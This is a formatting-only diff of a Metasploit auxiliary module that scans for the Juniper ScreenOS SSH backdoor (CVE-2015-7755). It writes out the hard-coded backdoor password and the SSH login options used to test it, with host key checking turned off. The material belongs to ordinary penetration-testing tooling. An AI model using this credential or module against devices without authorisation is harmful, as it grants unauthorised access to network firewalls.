@@ -11,31 +11,34 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SSH
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Juniper SSH Backdoor Scanner',
-      'Description'    => %q{
-        This module scans for the Juniper SSH backdoor (also valid on Telnet).
-        Any username is required, and the password is <<< %s(un='%s') = %u.
-      },
-      'Author'         => [
-        'hdm',                               # Discovery
-        'h00die <mike[at]stcyrsecurity.com>' # Module
-      ],
-      'References'     => [
-        ['CVE', '2015-7755'],
-        ['URL', 'https://blog.rapid7.com/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor'],
-        ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713']
-      ],
-      'DisclosureDate' => '2015-12-20',
-      'License'        => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Juniper SSH Backdoor Scanner',
+        'Description' => %q{
+          This module scans for the Juniper SSH backdoor (also valid on Telnet).
+          Any username is required, and the password is <<< %s(un='%s') = %u.
+        },
+        'Author' => [
+          'hdm',                               # Discovery
+          'h00die <mike[at]stcyrsecurity.com>' # Module
+        ],
+        'References' => [
+          ['CVE', '2015-7755'],
+          ['URL', 'https://blog.rapid7.com/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor'],
+          ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713']
+        ],
+        'DisclosureDate' => '2015-12-20',
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options([
       Opt::RPORT(22)
     ])
 
     register_advanced_options([
-      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
+      OptBool.new('SSH_DEBUG', [false, 'SSH debugging', false]),
       OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
     ])
   end
@@ -43,10 +46,10 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     factory = ssh_socket_factory
     ssh_opts = {
-      :port            => rport,
-      :auth_methods    => ['password', 'keyboard-interactive'],
-      :password        => %q{<<< %s(un='%s') = %u},
-      :proxy           => factory,
+      :port => rport,
+      :auth_methods => ['password', 'keyboard-interactive'],
+      :password => %q{<<< %s(un='%s') = %u},
+      :proxy => factory,
       :non_interactive => true,
       :verify_host_key => :never
     }
